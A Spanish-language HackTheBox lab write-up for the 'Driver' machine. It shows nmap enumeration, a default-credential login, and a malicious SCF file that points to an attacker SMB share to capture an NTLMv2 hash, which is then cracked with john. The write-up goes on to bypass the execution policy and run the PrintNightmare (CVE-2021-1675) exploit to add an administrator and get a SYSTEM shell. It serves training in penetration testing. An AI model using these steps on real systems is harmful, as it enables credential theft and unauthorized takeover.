---
title: "Driver - HTB Writeup"
layout: single
excerpt: "Driver es una máquina de dificultad fácil de HackTheBox. En esta máquina accedemos inicialmente aprovechandonos de un archivo SCF para obtener el hash de un usuario. Para escalar privilegios explotamos la famosa vulnerabilidad PrintNightmare"
show_date: true
classes: wide
header:
  teaser: https://user-images.githubusercontent.com/67548295/155843274-98763b01-699d-4aa5-8efd-35c17cc808ad.png
  teaser_home_page: true
  icon: "assets/images/icons/HackTheBox-icon.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - SCF file attack
  - PrintNightmare
  - Windows
---

![image](https://user-images.githubusercontent.com/67548295/155843539-783e9787-0da4-48fd-b90a-bdc00c2c0bd8.png)

# Enumeration

Empezamos con la fase de enumeración, antes de empezar a escanear puertos y demás cosas enviamos un paquete [ICMP](https://es.wikipedia.org/wiki/Protocolo_de_control_de_mensajes_de_Internet){:target="\_blank"}{:rel="noopener nofollow"} a la máquina víctima con la herramienta `ping`, con esto veremos su estado y su **sistema operativo**:

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Driver]
└──╼ $ ping -c 1 10.10.11.106
PING 10.10.11.106 (10.10.11.106) 56(84) bytes of data.
64 bytes from 10.10.11.106: icmp_seq=1 ttl=127 time=84.3 ms

--- 10.10.11.106 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 84.333/84.333/84.333/0.000 ms
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Se puede ver que la máquina está **activa** y que observando el `TTL`, concluimos que es una máquina **Windows**.

Más información sobre la **detección de OS** mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/){:target="\_blank"}{:rel="noopener nofollow"}.

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier){:target="\_blank"}{:rel="noopener nofollow"}.

### Nmap 

Una vez hemos comprobado la disponibilidad y sistema operativo de la máquina víctima, llega el turno de la fase de escaneo de puertos. Utilizaré `nmap` para ello:

```bash
┌─[✗]─[z3r0byte@z3r0byte]─[~/CTF/HTB/Driver]
└──╼ $ sudo nmap -p- --open -sS --min-rate 4000 -n 10.10.11.106 -sC -sV -oN targeted
 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-26 12:59 WET
Nmap scan report for 10.10.11.106
Host is up (0.075s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-02-26T19:58:26
|_  start_date: 2022-02-26T03:43:45
|_clock-skew: mean: 6h58m07s, deviation: 0s, median: 6h58m07s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.61 seconds
```

| Parámetro | Acción |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', que es más rápido y sigiloso que el tipo de escaneo por defecto. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido. |
| `-sC` | Utiliza un escaneo con una serie de scripts por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo. |

Vemos varios puertos abiertos

| Puerto | Servicio |
| 80 | Este puerto es usado por defecto para conexiones [HTTP](https://www.pickaweb.es/ayuda/que-es-http/){:target="\_blank"}{:rel="noopener nofollow"}|
| 135 | Normalmente, este puerto es utilizado para [RPC](https://www.ionos.es/digitalguide/servidores/know-how/que-es-rpc/){:target="\_blank"}{:rel="noopener nofollow"}|
| 445 | En Windows, este puerto se usa para el servicio [SMB](https://www.compuhoy.com/para-que-se-usa-el-puerto-445-en-windows-10/){:target="\_blank"}{:rel="noopener nofollow"}|
| 5985 | En windows, este puerto es utilizado por la herramienta de administración remota [WinRM](https://docs.microsoft.com/es-es/windows/win32/winrm/portal){:target="\_blank"}{:rel="noopener nofollow"}|

### HTTP enumeration

Comenzamos enumerando el servicio web alojado en el `puerto 80`. Uso la herramienta `whatweb` para intentar enumerar las tecnologías en uso del servidor web.

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Driver]
└──╼ $ whatweb http://10.10.11.106
http://10.10.11.106 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.106]
Microsoft-IIS[10.0], PHP[7.3.25], WWW-Authenticate[MFP Firmware Update Center. Please enter password for admin][Basic], X-Powered-By[PHP/7.3.25]
```
Bien, si nos fijamos, se puede ver que obtenemos un código de estado `401 Unauthorized`. Esto significa que el servidor requiere de unas **credenciales** para acceder.

Visito la web desde el navegador y vemos este panel de login manejado con [HTTP basic authentication](https://www.ibm.com/docs/en/cics-ts/5.4?topic=concepts-http-basic-authentication){:target="\_blank"}{:rel="noopener nofollow"}.

![image](https://user-images.githubusercontent.com/67548295/155846811-d913c334-04b4-486d-af6d-d00681b08304.png)

Pruebo con **credenciales comunes** y consigo acceder con `admin:admin`

![image](https://user-images.githubusercontent.com/67548295/155846867-0f0dbdc0-d520-4f3a-9487-2241925ac004.png)

# User.txt

![image](https://user-images.githubusercontent.com/67548295/155847024-0112b821-44b2-4b3f-b99b-013237430229.png)

Intento acceder a las secciones de la página pero veo que solo funciona el apartado "_Firmware Updates_"

![image](https://user-images.githubusercontent.com/67548295/155847072-15c2a08c-60db-42ca-9540-dfdb2c3121a5.png)

Podemos ver que se nos dice:

> Selecciona el modelo de la impresora y sube la respectiva actualizacion de firmware a nuestro archivo compartido. Nuestro equipo de pruebas revisará las subidas manualmente e iniciará las pruebas pronto.

Me llama mucho la atención la parte en la que nos dicen que los archivos subidos serán **revisados manualmente**

Esto me da a pensar en un posible vector de entrada, podríamos intentar efectuar un [SCF file attack](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/){:target="\_blank"}{:rel="noopener nofollow"}.

Para hacer esto, seguiremos unos pasos:

###### 1º Paso - Creación del archivo SCF

Creamos el archivo **SCF malicioso** el cual intentará cargar su icono de nuestro recurso compartido que crearemos más adelante:

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Driver]
└──╼ $ cat malicious.scf 
[Shell]
Command=2
IconFile=\\10.10.14.40\zero\icon.ico
[Taskbar]
Command=ToggleDesktop
```

###### 2º Paso - Levantamos un servidor SMB

Para este paso será necesario tener `Impacket` instalado. Si no lo tienes, puedes instalarlo de forma rápida con este comando:

> `python3 -m pip install impacket`

Para montar un **servidor SMB** usamos este comando:

> `impacket-smbserver zero $(pwd)`

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Driver]
└──╼ $ sudo impacket-smbserver zero $(pwd) 
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
###### 3º Paso - Subimos el archivo SCF al servidor

![image](https://user-images.githubusercontent.com/67548295/155848422-6b666081-bb7b-4498-bfc8-effdb2cf8e39.png)

Y vemos que recibimos un **hash** en nuestro **servidor SMB**

```bash
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.106,49515)
[*] AUTHENTICATE_MESSAGE (DRIVER\tony,DRIVER)
[*] User DRIVER\tony authenticated successfully
[*] tony::DRIVER:   HIDDEN
[-] TreeConnectAndX not found SHARE
[-] TreeConnectAndX not found SHARE
[*] Disconnecting Share(1:IPC$)
[*] Closing down connection (10.10.11.106,49515)
[*] Remaining connections []
```
---

Probemos a _crackear_ este hash con `john`

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Driver/content]
└──╼ $ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
XXXXXXXX          (tony)
1g 0:00:00:00 DONE (2022-02-26 15:31) 1.818g/s 59578p/s 59578c/s 59578C/s !!!!!!..eatme1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```
¡Obtenemos una contraseña!

Sabemos que el puerto que aloja al servicio **WinRM** está abierto, asi que intentemos acceder por ahí con las credenciales que hemos obtenido.

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/Driver/content]
└──╼ $ evil-winrm -u tony -p liltony -i 10.10.11.106

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents> 
```

Conseguimos acceso inicial como usuario **Tony**

Una vez en este punto, es posible ver la flag `user.txt` en `C:\Users\tony\Desktop\user.txt`:

```powershell
*Evil-WinRM* PS C:\Users\tony> (type .\Desktop\user.txt).Substring(0,15)
3dc0ff40753a2a2
```

# Root.txt

Enumero el sistema en busca de posibles **vectores de escalada de privilegios** hasta que encuentro uno.

Probando a leer el historial de **powershell**, el cual suele estar localizado en la ruta `C:\users\USUARIO\appdata\roaming\microsoft\windows\PowerShell\PSReadline` me encuentro con esto:

```powershell
*Evil-WinRM* PS C:\Users\tony\appdata\Roaming\Microsoft\Windows\PowerShell\PSReadline> type ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

ping 1.1.1.1
ping 1.1.1.1
```
Vemos en el historial que se ha añadido una impresora.

Si sueles seguir noticiarios de ciberseguridad, probablemente hayas oido hablar de la vulnerabilidad **PrintNightmare**, la cual se aprovecha delservicio de impresión para instalar **drivers maliciosos** con altos privilegios.

Para confirmar esto, veamos si el servicio `Spoolsv` está ejecutándose:

```powershell
*Evil-WinRM* PS C:\Users\tony\appdata\Roaming\Microsoft\Windows\PowerShell\PSReadline> ps | findstr spoolsv
    384      22     5228      14520 ...13            1160 spoolsv
```
Y vemos que sí. 

Bien, intento buscar un exploit para explotar esta vulnerabilidad.

   * [calebstewart/CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675){:target="\_blank"}{:rel="noopener nofollow"}

Encuentro un exploit escrito en **powershell**.

Lo transfiero a la máquina:

```bash
*Evil-WinRM* PS C:\Users\tony> upload CVE-2021-1675.ps1
Info: Uploading CVE-2021-1675.ps1 to C:\Users\tony\CVE-2021-1675.ps1

                                                             
Data: 238080 bytes of 238080 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\tony> dir


    Directory: C:\Users\tony


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        6/11/2021   7:01 AM                Contacts
d-r---        2/26/2022   3:02 PM                Desktop
*d-r---        2/26/2022   3:45 PM                Documents
d-r---        6/11/2021   7:05 AM                Downloads
d-r---        6/11/2021   7:01 AM                Favorites
d-r---        6/11/2021   7:01 AM                Links
d-r---        6/11/2021   7:01 AM                Music
d-r---         8/6/2021   7:34 AM                OneDrive
d-r---        6/11/2021   7:03 AM                Pictures
d-r---        6/11/2021   7:01 AM                Saved Games
d-r---        6/11/2021   7:01 AM                Searches
d-r---        6/11/2021   7:01 AM                Videos
-a----        2/26/2022   3:46 PM         178561 CVE-2021-1675.ps1
```
Pruebo a ejecutar el exploit:

```powershell
*Evil-WinRM* PS C:\Users\tony\Contacts> .\CVE-2021-1675.ps1
File C:\Users\tony\Contacts\CVE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ .\CVE-2021-1675.ps1
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess
```
Pero como se puede ver, no se nos permite ejecutar el exploit debido al [Execution Policy](https://docs.microsoft.com/es-es/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2){:rel="noopener nofollow"} que nos restringe la ejecución de scripts.

Podemos verificar que esta opción está habilitada con el siguiente comando:

```powershell
*Evil-WinRM* PS C:\Users\tony\Contacts> Get-ExecutionPolicy

Restricted
```
Comprobamos que está **restringida** la ejecución de scripts.

Bien, hay varias maneras de _bypassear_ esta restricción. Una de ellas es simplemente cambiar los política para nuestro usuario, de la siguiente manera:

```powershell
*Evil-WinRM* PS C:\Users\tony\Contacts> Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
```
Ahora ya podríamos ejecutar el exploit:

```powershell
*Evil-WinRM* PS C:\Users\tony\Contacts> Import-Module .\cve-2021-1675.ps1
*Evil-WinRM* PS C:\Users\tony\Contacts> Invoke-Nightmare -NewUser "z3r0" -NewPassword "zero123$!"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user z3r0 as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

Vale, se supone que se hemos creado un usuario administrador. Probemos a ver si podemos conectarnos con `psexec`:

```bash
┌──[z3r0byte@z3r0byte]─[~/CTF/HTB/Driver]
└──╼ $ sudo psexec.py 'z3r0:zero123$!@10.10.11.106'
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.11.106.....
[*] Found writable share ADMIN$
[*] Uploading file XvxgLeIz.exe
[*] Opening SVCManager on 10.10.11.106.....
[*] Creating service YnlZ on 10.10.11.106.....
[*] Starting service YnlZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```
¡Conseguimos escalar privilegios a usuario administrador!

Una vez en este punto, podremos visualizar la flag `root.txt` en `C:\Users\Administrator\Desktop\root.txt`:

```bat
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
d0728609099971XXXXXXXXXXXXXXXXX
```
